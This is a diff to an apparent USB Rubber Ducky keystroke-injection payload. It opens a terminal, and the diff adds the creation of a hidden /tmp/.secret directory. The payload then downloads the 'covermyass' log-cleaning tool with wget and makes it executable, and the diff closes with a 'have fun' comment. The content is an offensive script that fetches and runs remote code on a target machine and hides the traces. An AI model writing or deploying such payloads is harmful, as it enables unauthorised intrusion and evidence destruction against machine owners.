@@ -14,6 +14,10 @@ REM ==================================================
 DELAY 1000
 CTRL-ALT t
 DELAY 500
+STRING mkdir /tmp/.secret
+DELAY 750
+STRING cd /tmp/.secret
+DELAY 750
 STRING wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
 DELAY 5000
 STRING chmod +x covermyass
@@ -23,3 +27,6 @@ DELAY 1000
 REM ==================================================
 REM = END Program                                    =
 REM ==================================================
+
+REM don't forget to remove hidden dir!
+REM have fun ...
